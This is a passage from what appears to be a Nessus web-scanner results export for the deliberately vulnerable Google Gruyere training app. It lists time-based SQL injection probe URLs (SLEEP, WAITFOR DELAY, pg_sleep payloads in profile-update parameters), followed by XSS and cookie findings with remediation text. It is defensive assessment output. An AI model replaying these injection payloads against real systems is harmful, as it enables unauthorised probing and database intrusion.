1 timeouts encountered for URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/saveprofile?private_snippet=nessus_was_text9d37hrrv&action=update&name=nessus_was_name_jwbgkame&oldpw=nessus_was_textnctz5k8x&pw=nessus_was_textnctz5k8x&icon=nessus_was_text3p70l5rq&web_site=nessus_was_textw9zw9d4n&color=nessus_was_text50voc1vq%22%20WHERE%201%3D1%20AND%20%28SELECT%205443%20FROM%20%28SELECT%28SLEEP%282%29%29%29lLoQt%29%20--%20-'
1 timeouts encountered for URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/saveprofile?private_snippet=nessus_was_text9d37hrrv&action=update&name=nessus_was_name_jwbgkame&oldpw=nessus_was_textnctz5k8x&pw=nessus_was_textnctz5k8x&icon=nessus_was_text3p70l5rq&web_site=nessus_was_textw9zw9d4n&color=%22%20WHERE%201%3D1%20AND%20%28SELECT%205443%20FROM%20%28SELECT%28SLEEP%282%29%29%29lLoQt%29%20--%20-'
1 timeouts encountered for URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/saveprofile?private_snippet=&action=&name=&oldpw=&pw=&icon=&web_site=&color=%22%20WHERE%201%3D1%20AND%20%28SELECT%205443%20FROM%20%28SELECT%28SLEEP%282%29%29%29lLoQt%29%20--%20-'
1 timeouts encountered for URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/saveprofile?private_snippet=%27%20AND%20%28SELECT%205443%20FROM%20%28SELECT%28SLEEP%282%29%29%29a%29--%20-&action=update&name=nessus_was_name_dqhhracw&oldpw=nessus_was_textmw7s2idt&pw=nessus_was_textmw7s2idt&icon=nessus_was_text8yx34x2g&web_site=nessus_was_text5njxukg7&color=nessus_was_textow5h5ch1'
1 timeouts encountered for URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/saveprofile?private_snippet=nessus_was_textul7mu4xa&action=%27%20AND%20%28SELECT%205443%20FROM%20%28SELECT%28SLEEP%282%29%29%29a%29--%20-&name=nessus_was_name_cdefnebq&oldpw=nessus_was_textx8spvsnp&pw=nessus_was_textx8spvsnp&icon=nessus_was_textd6s2hzg3&web_site=nessus_was_textmid3jkfp&color=nessus_was_text5ztjln9l'
1 timeouts encountered for URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/saveprofile?private_snippet=nessus_was_textym38ezbz&action=update&name=%27%20AND%20%28SELECT%205443%20FROM%20%28SELECT%28SLEEP%282%29%29%29a%29--%20-&oldpw=nessus_was_textepwyyx2b&pw=nessus_was_textepwyyx2b&icon=nessus_was_textuotwz1vz&web_site=nessus_was_text7r8klofq&color=nessus_was_texte0un8l5f'
1 timeouts encountered for URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/saveprofile?private_snippet=&action=&name=&oldpw=&pw=%27%20AND%20%28SELECT%205443%20FROM%20%28SELECT%28SLEEP%282%29%29%29a%29--%20-&icon=&web_site=&color='
1 timeouts encountered for URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/saveprofile?private_snippet=&action=&name=&oldpw=&pw=&icon=nessus_was_textpj0hztjt%27%20AND%20%28SELECT%205443%20FROM%20%28SELECT%28SLEEP%282%29%29%29a%29--%20-&web_site=&color='
1 timeouts encountered for URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/saveprofile?private_snippet=nessus_was_texte8gw7xpa&action=update&name=nessus_was_name_hjpfgnjw&oldpw=nessus_was_textktfsuuqa&pw=nessus_was_textktfsuuqa&icon=nessus_was_textzo7nwm2m&web_site=nessus_was_textcudlp6jc%27%20AND%20%28SELECT%205443%20FROM%20%28SELECT%28SLEEP%282%29%29%29a%29--%20-&color=nessus_was_text48fnp9zb'
1 timeouts encountered for URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/saveprofile?private_snippet=nessus_was_texte8gw7xpa&action=update&name=nessus_was_name_hjpfgnjw&oldpw=nessus_was_textktfsuuqa&pw=nessus_was_textktfsuuqa&icon=nessus_was_textzo7nwm2m&web_site=%27%20AND%20%28SELECT%205443%20FROM%20%28SELECT%28SLEEP%282%29%29%29a%29--%20-&color=nessus_was_text48fnp9zb'
1 timeouts encountered for URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/saveprofile?private_snippet=&action=&name=&oldpw=&pw=&icon=&web_site=%27%20AND%20%28SELECT%205443%20FROM%20%28SELECT%28SLEEP%282%29%29%29a%29--%20-&color='
1 timeouts encountered for URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/saveprofile?private_snippet=nessus_was_textw5wsv2sa&action=update&name=nessus_was_name_fcpnixfk&oldpw=nessus_was_textm812ivcr&pw=nessus_was_textm812ivcr&icon=nessus_was_texturlirbj1&web_site=nessus_was_textg7ija8f2&color=nessus_was_textkekoetkl%27%20AND%20%28SELECT%205443%20FROM%20%28SELECT%28SLEEP%282%29%29%29a%29--%20-'
1 timeouts encountered for URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/saveprofile?private_snippet=nessus_was_text90okubm6&action=update&name=nessus_was_name_plylcnga&oldpw=nessus_was_textoro5ylru&pw=nessus_was_textoro5ylru&icon=nessus_was_textsm1rkijr&web_site=nessus_was_textd7omgacl&color=nessus_was_textwid1s9ed%22%3Dsleep%282%29%3D%22'
1 timeouts encountered for URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/saveprofile?private_snippet=&action=&name=&oldpw=&pw=&icon=&web_site=&color=nessus_was_textwid1s9ed%22%3Dsleep%282%29%3D%22'
1 timeouts encountered for URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/saveprofile?private_snippet=nessus_was_text90okubm6&action=update&name=nessus_was_name_plylcnga&oldpw=nessus_was_textoro5ylru&pw=nessus_was_textoro5ylru&icon=nessus_was_textsm1rkijr&web_site=nessus_was_textd7omgacl&color=%22%3Dsleep%282%29%3D%22'
1 timeouts encountered for URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/saveprofile?private_snippet=nessus_was_text24syvkt0%3Bwaitfor%20delay%20%270%3A0%3A2%27--%20%22%3Bwaitfor%20delay%20%270%3A0%3A2%27--%20%22&action=update&name=nessus_was_name_jsynyxsv&oldpw=nessus_was_textbbz7gxqe&pw=nessus_was_textbbz7gxqe&icon=nessus_was_text642yczgl&web_site=nessus_was_textnhr2st58&color=nessus_was_textx36hb543'
1 timeouts encountered for URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/saveprofile?private_snippet=nessus_was_text24syvkt0%3Bwaitfor%20delay%20%270%3A0%3A2%27--%20%22%3Bwaitfor%20delay%20%270%3A0%3A2%27--%20%22&action=&name=&oldpw=&pw=&icon=&web_site=&color='
1 timeouts encountered for URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/saveprofile?private_snippet=%3Bwaitfor%20delay%20%270%3A0%3A2%27--%20%22%3Bwaitfor%20delay%20%270%3A0%3A2%27--%20%22&action=update&name=nessus_was_name_jsynyxsv&oldpw=nessus_was_textbbz7gxqe&pw=nessus_was_textbbz7gxqe&icon=nessus_was_text642yczgl&web_site=nessus_was_textnhr2st58&color=nessus_was_textx36hb543'
1 timeouts encountered for URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/saveprofile?private_snippet=%3Bwaitfor%20delay%20%270%3A0%3A2%27--%20%22%3Bwaitfor%20delay%20%270%3A0%3A2%27--%20%22&action=&name=&oldpw=&pw=&icon=&web_site=&color='
1 timeouts encountered for URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/saveprofile?private_snippet=nessus_was_textiqf3ta1w&action=update%3Bwaitfor%20delay%20%270%3A0%3A2%27--%20%22%3Bwaitfor%20delay%20%270%3A0%3A2%27--%20%22&name=nessus_was_name_jhshvrxs&oldpw=nessus_was_textkoh1o9si&pw=nessus_was_textkoh1o9si&icon=nessus_was_text2hd9uvrk&web_site=nessus_was_textmt32s6ia&color=nessus_was_textwjzrxndt'
1 timeouts encountered for URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/saveprofile?private_snippet=nessus_was_textiqf3ta1w&action=%3Bwaitfor%20delay%20%270%3A0%3A2%27--%20%22%3Bwaitfor%20delay%20%270%3A0%3A2%27--%20%22&name=nessus_was_name_jhshvrxs&oldpw=nessus_was_textkoh1o9si&pw=nessus_was_textkoh1o9si&icon=nessus_was_text2hd9uvrk&web_site=nessus_was_textmt32s6ia&color=nessus_was_textwjzrxndt'
1 timeouts encountered for URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/saveprofile?private_snippet=&action=%3Bwaitfor%20delay%20%270%3A0%3A2%27--%20%22%3Bwaitfor%20delay%20%270%3A0%3A2%27--%20%22&name=&oldpw=&pw=&icon=&web_site=&color='
1 timeouts encountered for URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/saveprofile?private_snippet=nessus_was_text4fylr87x&action=update&name=nessus_was_name_zrzsoqju%3Bwaitfor%20delay%20%270%3A0%3A2%27--%20%22%3Bwaitfor%20delay%20%270%3A0%3A2%27--%20%22&oldpw=nessus_was_textxafe8vox&pw=nessus_was_textxafe8vox&icon=nessus_was_text0nbd6y3q&web_site=nessus_was_textp4w09x9o&color=nessus_was_textzemj4ph8'
1 timeouts encountered for URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/saveprofile?private_snippet=nessus_was_textvsnvmgjz&action=update&name=nessus_was_name_xpbjptmt&oldpw=nessus_was_textzkgvfgze%3Bwaitfor%20delay%20%270%3A0%3A__TIME__%27--%20%22%3Bwaitfor%20delay%20%270%3A0%3A__TIME__%27--%20%22&pw=nessus_was_textzkgvfgze%3Bwaitfor%20delay%20%270%3A0%3A2%27--%20%22%3Bwaitfor%20delay%20%270%3A0%3A2%27--%20%22&icon=nessus_was_textwxx5mwqo&web_site=nessus_was_text7t2c2ryw&color=nessus_was_text7qvow0mr'
1 timeouts encountered for URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/saveprofile?private_snippet=&action=&name=&oldpw=&pw=nessus_was_textzkgvfgze%3Bwaitfor%20delay%20%270%3A0%3A2%27--%20%22%3Bwaitfor%20delay%20%270%3A0%3A2%27--%20%22&icon=&web_site=&color='
1 timeouts encountered for URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/saveprofile?private_snippet=%27%3Bwaitfor%20delay%20%270%3A0%3A2%27--%20%27&action=update&name=nessus_was_name_hofcawnn&oldpw=nessus_was_textwzom2jls&pw=nessus_was_textwzom2jls&icon=nessus_was_textm2gycrbn&web_site=nessus_was_textnm6ne9jd&color=nessus_was_text2oc44h5a'
1 timeouts encountered for URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/saveprofile?private_snippet=nessus_was_texteh9qtgtd&action=update&name=nessus_was_name_cjqqfeja&oldpw=nessus_was_textn7q54e7d&pw=nessus_was_textn7q54e7d&icon=nessus_was_textiwhsq09c%29%3Bwaitfor%20delay%20%270%3A0%3A2%27--%20%22%29%3Bwaitfor%20delay%20%270%3A0%3A2%27--%20%22&web_site=nessus_was_textdojedtmf&color=nessus_was_textu1dxfawu'
1 timeouts encountered for URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/saveprofile?private_snippet=nessus_was_textn139bk41&action=update&name=nessus_was_name_rgaooeev&oldpw=nessus_was_textrhzo42oc&pw=nessus_was_textrhzo42oc&icon=nessus_was_textqltbwd5l&web_site=%29%3Bwaitfor%20delay%20%270%3A0%3A2%27--%20%22%29%3Bwaitfor%20delay%20%270%3A0%3A2%27--%20%22&color=nessus_was_textv94tzizi'
1 timeouts encountered for URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/saveprofile?private_snippet=nessus_was_textvhd52k5n&action=update&name=nessus_was_name_ouxftohx&oldpw=nessus_was_text4gunp84q&pw=nessus_was_text4gunp84q&icon=nessus_was_text0wiaqhk4&web_site=nessus_was_texteg8ty5eo&color=%29%3Bwaitfor%20delay%20%270%3A0%3A2%27--%20%22%29%3Bwaitfor%20delay%20%270%3A0%3A2%27--%20%22'
1 timeouts encountered for URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/saveprofile?private_snippet=&action=%29%27%3Bwaitfor%20delay%20%270%3A0%3A2%27--%20%27&name=&oldpw=&pw=&icon=&web_site=&color='
1 timeouts encountered for URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/saveprofile?private_snippet=nessus_was_textymraknmq&action=update&name=nessus_was_name_ojntknww%29%27%3Bwaitfor%20delay%20%270%3A0%3A2%27--%20%27&oldpw=nessus_was_textdaynuttj&pw=nessus_was_textdaynuttj&icon=nessus_was_text7v2dw2o3&web_site=nessus_was_textg6pkapzn&color=nessus_was_textdr4qevqg'
1 timeouts encountered for URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/saveprofile?private_snippet=&action=&name=nessus_was_name_ojntknww%29%27%3Bwaitfor%20delay%20%270%3A0%3A2%27--%20%27&oldpw=&pw=&icon=&web_site=&color='
1 timeouts encountered for URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/saveprofile?private_snippet=nessus_was_textymraknmq&action=update&name=%29%27%3Bwaitfor%20delay%20%270%3A0%3A2%27--%20%27&oldpw=nessus_was_textdaynuttj&pw=nessus_was_textdaynuttj&icon=nessus_was_text7v2dw2o3&web_site=nessus_was_textg6pkapzn&color=nessus_was_textdr4qevqg'
1 timeouts encountered for URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/saveprofile?private_snippet=&action=&name=%29%27%3Bwaitfor%20delay%20%270%3A0%3A2%27--%20%27&oldpw=&pw=&icon=&web_site=&color='
1 timeouts encountered for URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/saveprofile?private_snippet=&action=&name=&oldpw=&pw=&icon=nessus_was_textzkftszh3%29%27%3Bwaitfor%20delay%20%270%3A0%3A2%27--%20%27&web_site=&color='
1 timeouts encountered for URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/saveprofile?private_snippet=nessus_was_texttwjz63kh&action=update&name=nessus_was_name_ixxguhod&oldpw=nessus_was_textkcbbfa1w&pw=nessus_was_textkcbbfa1w&icon=nessus_was_textjake7uu6&web_site=nessus_was_textorddmy9u&color=nessus_was_textf715502m%29%29%27%3Bwaitfor%20delay%20%270%3A0%3A2%27--%20%27'
1 timeouts encountered for URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/saveprofile?private_snippet=&action=&name=&oldpw=&pw=&icon=&web_site=&color=nessus_was_textf715502m%29%29%27%3Bwaitfor%20delay%20%270%3A0%3A2%27--%20%27'
1 timeouts encountered for URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/saveprofile?private_snippet=nessus_was_texttwjz63kh&action=update&name=nessus_was_name_ixxguhod&oldpw=nessus_was_textkcbbfa1w&pw=nessus_was_textkcbbfa1w&icon=nessus_was_textjake7uu6&web_site=nessus_was_textorddmy9u&color=%29%29%27%3Bwaitfor%20delay%20%270%3A0%3A2%27--%20%27'
1 timeouts encountered for URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/saveprofile?private_snippet=nessus_was_textyw2tt9211%3Bwaitfor%20delay%20%270%3A0%3A2%27--&action=update&name=nessus_was_name_uelroura&oldpw=nessus_was_texty7tx5m1q&pw=nessus_was_texty7tx5m1q&icon=nessus_was_textr9t2jnou&web_site=nessus_was_textjfec0v16&color=nessus_was_text7i7talod'
1 timeouts encountered for URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/saveprofile?private_snippet=nessus_was_textyw2tt9211%3Bwaitfor%20delay%20%270%3A0%3A2%27--&action=&name=&oldpw=&pw=&icon=&web_site=&color='
1 timeouts encountered for URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/saveprofile?private_snippet=1%3Bwaitfor%20delay%20%270%3A0%3A2%27--&action=update&name=nessus_was_name_uelroura&oldpw=nessus_was_texty7tx5m1q&pw=nessus_was_texty7tx5m1q&icon=nessus_was_textr9t2jnou&web_site=nessus_was_textjfec0v16&color=nessus_was_text7i7talod'
1 timeouts encountered for URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/saveprofile?private_snippet=nessus_was_textgsgsr86z&action=update1%3Bwaitfor%20delay%20%270%3A0%3A2%27--&name=nessus_was_name_ocngyeea&oldpw=nessus_was_textw1briwqn&pw=nessus_was_textw1briwqn&icon=nessus_was_text9iqd67fz&web_site=nessus_was_text4nc5ff2r&color=nessus_was_textup9n8vx2'
1 timeouts encountered for URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/saveprofile?private_snippet=&action=update1%3Bwaitfor%20delay%20%270%3A0%3A2%27--&name=&oldpw=&pw=&icon=&web_site=&color='
1 timeouts encountered for URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/saveprofile?private_snippet=&action=1%3Bwaitfor%20delay%20%270%3A0%3A2%27--&name=&oldpw=&pw=&icon=&web_site=&color='
1 timeouts encountered for URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/saveprofile?private_snippet=&action=&name=&oldpw=nessus_was_textk4xr9zgv&pw=&icon=&web_site=&color='
1 timeouts encountered for URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/saveprofile?private_snippet=nessus_was_texte55h5viz&action=update&name=nessus_was_name_knxlixua&oldpw=nessus_was_text62m1604w1%3Bwaitfor%20delay%20%270%3A0%3A__TIME__%27--&pw=nessus_was_text62m1604w1%3Bwaitfor%20delay%20%270%3A0%3A2%27--&icon=nessus_was_textwzyo14xx&web_site=nessus_was_text08zexelx&color=nessus_was_texteug4pkmk'
1 timeouts encountered for URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/saveprofile?private_snippet=&action=update%3Bselect%20pg_sleep%282%29%3B%20--%20%27%3Bselect%20pg_sleep%282%29%3B%20--%20%22%3Bselect%20pg_sleep%282%29%3B%20--%20-&name=&oldpw=&pw=&icon=&web_site=&color='
1 timeouts encountered for URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/saveprofile?private_snippet=&action=%3Bselect%20pg_sleep%282%29%3B%20--%20%27%3Bselect%20pg_sleep%282%29%3B%20--%20%22%3Bselect%20pg_sleep%282%29%3B%20--%20-&name=&oldpw=&pw=&icon=&web_site=&color='
1 timeouts encountered for URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/saveprofile?private_snippet=nessus_was_text2d9ddgxb&action=update&name=nessus_was_name_erchfsjo%3Bselect%20pg_sleep%282%29%3B%20--%20%27%3Bselect%20pg_sleep%282%29%3B%20--%20%22%3Bselect%20pg_sleep%282%29%3B%20--%20-&oldpw=nessus_was_textjemvajux&pw=nessus_was_textjemvajux&icon=nessus_was_textd8ak37v9&web_site=nessus_was_textsjeedq1e&color=nessus_was_text3q4x84ow'
20 timeouts encountered for URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/saveprofile?action=update&name=nessus_was_name_&oldpw=nessus_was_textefs5vllj&pw=nessus_was_textiq4llvhg&icon=nessus_was_text1kied3fg&web_site=nessus_was_textf0dy93r6&color=nessus_was_textwjt860ol&private_snippet=nessus_was_textkn62jsq7'
1 timeouts encountered for URL 'http://google-gruyere.appspot.com/425575187579520270957883614548769509881'
64 timeouts encountered for URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/newsnippet2'",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Cross Site Scripting (XSS) allows clients to inject scripts into a request and have the server return the script to the client in the response. This occurs because the application is taking untrusted data (in this example, from the client) and reusing it without performing any validation or sanitisation.

If the injected script is returned immediately this is known as reflected XSS. If the injected script is stored by the server and returned to any client visiting the affected page, then this is known as persistent XSS (also stored XSS).

Scanner has discovered that it is possible to insert script content directly into the requested PATH and have it returned in the server's response. For example `HTTP://yoursite.com/INJECTION_HERE/`, where `INJECTION_HERE` represents the location where the scanner payload was injected.","Cross Site Scripting",98107,"Cross-Site Scripting (XSS) in path",,2017-03-31T00:00:00Z,2021-11-26T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet",Medium,"To remedy XSS vulnerabilities, it is important to never use untrusted or unfiltered data within the code of a HTML page.
Untrusted data can originate not only form the client but potentially a third party or previously uploaded file etc.
Filtering of untrusted data typically involves converting special characters to their HTML entity encoded counterparts (however, other methods do exist, see references). These special characters include:
* `&` * `<` * `>` * `'` * `'` * `/`
An example of HTML entity encoding is converting `<` to `&lt;`.
Although it is possible to filter untrusted input, there are five locations within an HTML page where untrusted input (even if it has been filtered) should never be placed:
1. Directly in a script. 2. Inside an HTML comment. 3. In an attribute name. 4. In a tag name. 5. Directly in CSS.
Each of these locations have their own form of escaping and filtering.
_Because many browsers attempt to implement XSS protection, any manual verification of this finding should be conducted using multiple different browsers and browser versions._",,"b6c87f44-78e1-4d98-8849-7b2d6c1e1e17",2022-03-15T21:06:17.432Z,2022-03-15T15:02:45Z,"Vulnerability has been detected on URL 'http://google-gruyere.appspot.com/563265819128830739647592760263700851280/feed.gtl' by exploiting 'path' element named 'xss_path' and injecting following payload:

 | <my_tag_c1fc528d-1dd4-4d9e-99f9-4e1ad14d9dbd/>

To confirm the presence of the vulnerability, this proof has been identified in the target response:

 | <my_tag_c1fc528d-1dd4-4d9e-99f9-4e1ad14d9dbd/>

The information used to check the vulnerability have been provided in attachment.",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"The scanner identified some responses with a status code other than the usual 200 (OK), 301 (Moved Permanently), 302 (Found) and 404 (Not Found) codes. These codes can provide useful insights into the behavior of the web application and identify any unexpected responses to be addressed.","Web Applications",98050,"Interesting response",,2017-03-31T00:00:00Z,2021-06-14T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]","http://www.w3.org/Protocols/rfc2616/rfc2616-sec10.html, https://en.wikipedia.org/wiki/List_of_HTTP_status_codes",Info,,,"b85daec5-c90e-4bed-ba32-87b39eb5ae08",2022-03-15T18:42:41.743Z,2022-03-15T16:46:35Z,"A response has been received with a response code '405' which may require further investigation to verify if this response is due to an abnormal behavior of the target.

The response has been triggered by an HTTP OPTIONS request made on the URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/feed.gtl'.",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.0,"CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N",5.3,"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N","The web server on the remote host contains publicly accessible FTP configuration files. These configuration files are produced by ftp software and contain details of ftp credentials and/or hosts and other potentially sensitive information. This may be used to access content from the FTP server that might otherwise be private.","Data Exposure",113080,"FTP Credentials Disclosure",,2021-12-21T00:00:00Z,2021-12-21T00:00:00Z,"owasp_api_2019=[API3, API7], owasp_2010=[A6], owasp_2013=[A5], owasp_2017=[A6], owasp_2021=[A1], cwe=[538], cve=[], cpe=[], wasc=[Predictable Resource Location], bid=[]","https://filezillapro.com/docs/v3/advanced/how-to-configure-filezilla-pro-defaults-file-fzdefaults-xml/, https://codexns.io/products/sftp_for_sublime/settings",Medium,"Remove the listed FTP configuration files.",,"b9a08113-328d-4ab4-8a2a-8f1be9008b31",2022-03-15T21:06:17.432Z,2022-03-15T16:18:11Z,"The scanner has been able to detect a FTP settings file at https://google-gruyere.appspot.com/563265819128830739647592760263700851280/%3Cscript%3Ealert(1)%3C/FileZilla.xml.",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Cross Site Scripting (XSS) allows clients to inject scripts into a request and have the server return the script to the client in the response. This occurs because the application is taking untrusted data (in this example, from the client) and reusing it without performing any validation or sanitisation.

If the injected script is returned immediately this is known as reflected XSS. If the injected script is stored by the server and returned to any client visiting the affected page, then this is known as persistent XSS (also stored XSS).

Scanner has discovered that it is possible to insert script content directly into the requested PATH and have it returned in the server's response. For example `HTTP://yoursite.com/INJECTION_HERE/`, where `INJECTION_HERE` represents the location where the scanner payload was injected.","Cross Site Scripting",98107,"Cross-Site Scripting (XSS) in path",,2017-03-31T00:00:00Z,2021-11-26T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet",Medium,"To remedy XSS vulnerabilities, it is important to never use untrusted or unfiltered data within the code of a HTML page.
Untrusted data can originate not only form the client but potentially a third party or previously uploaded file etc.
Filtering of untrusted data typically involves converting special characters to their HTML entity encoded counterparts (however, other methods do exist, see references). These special characters include:
* `&` * `<` * `>` * `'` * `'` * `/`
An example of HTML entity encoding is converting `<` to `&lt;`.
Although it is possible to filter untrusted input, there are five locations within an HTML page where untrusted input (even if it has been filtered) should never be placed:
1. Directly in a script. 2. Inside an HTML comment. 3. In an attribute name. 4. In a tag name. 5. Directly in CSS.
Each of these locations have their own form of escaping and filtering.
_Because many browsers attempt to implement XSS protection, any manual verification of this finding should be conducted using multiple different browsers and browser versions._",,"ba52d2ef-19be-4457-af74-9c988ea1c76f",2022-03-15T21:06:17.432Z,2022-03-15T16:10:02Z,"Vulnerability has been detected on URL 'https://google-gruyere.appspot.com/563265819128830739647592760263700851280/&gt' by exploiting 'path' element named 'xss_path' and injecting following payload:

 | <my_tag_c1fc528d-1dd4-4d9e-99f9-4e1ad14d9dbd/>

To confirm the presence of the vulnerability, this proof has been identified in the target response:

 | <my_tag_c1fc528d-1dd4-4d9e-99f9-4e1ad14d9dbd/>

The information used to check the vulnerability have been provided in attachment.",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",2.6,"CVSS2#AV:N/AC:H/Au:N/C:P/I:N/A:N",3.1,"CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N","SameSite is an attribute which can be set on a cookie to instruct the web browser if this cookie can be sent along with cross-site requests to help prevent Cross-Site Request Forgery (CSRF) attacks.

The attribute has three possible values :

 - Strict : the cookie will only be sent in a first-party context, thus preventing cross-site requests initiated from third-party websites to include it.

 - Lax : the cookie is allowed to be sent in GET cross-site requests initiated by the top-level navigation from third-party websites. For example, following an hypertext link from the external website will make the request include the cookie.

 - None : the cookie is explicitly set to be sent by the browser in any context.

The scanner identified the lack of SameSite attribute on cookies set by the application or a misconfiguration.","Web Applications",115540,"Cookie Without SameSite Flag Detected",,2018-12-14T00:00:00Z,2021-11-26T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A5], owasp_2013=[A8], owasp_2017=[], owasp_2021=[A1], cwe=[352], cve=[], cpe=[], wasc=[Cross-Site Request Forgery], bid=[]","https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite, https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html#samesite-cookie-attribute, https://web.dev/samesite-cookies-explained, https://blog.chromium.org/2019/10/developers-get-ready-for-new.html",Low,"Web browsers default behavior may differ when processing cookies in a cross-site context, making the final decision to send the cookie in this context unpredictable. The SameSite attribute should be set in every cookie to enforce the expected result by developers. When using the 'None' attribute value, ensure that the cookie is also set with the 'Secure' flag.",,"bd36c211-46aa-456d-8d9d-a2cb5441a62d",2022-03-15T18:42:41.743Z,2022-03-15T17:17:24Z,"The scanner detected a cookie named 'GRUYERE_ID' which does not have the 'SameSite' attribute set.",NONE,Low,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Cross Site Scripting (XSS) allows clients to inject scripts into a request and have the server return the script to the client in the response. This occurs because the application is taking untrusted data (in this example, from the client) and reusing it without performing any validation or sanitisation.

If the injected script is returned immediately this is known as reflected XSS. If the injected script is stored by the server and returned to any client visiting the affected page, then this is known as persistent XSS (also stored XSS).

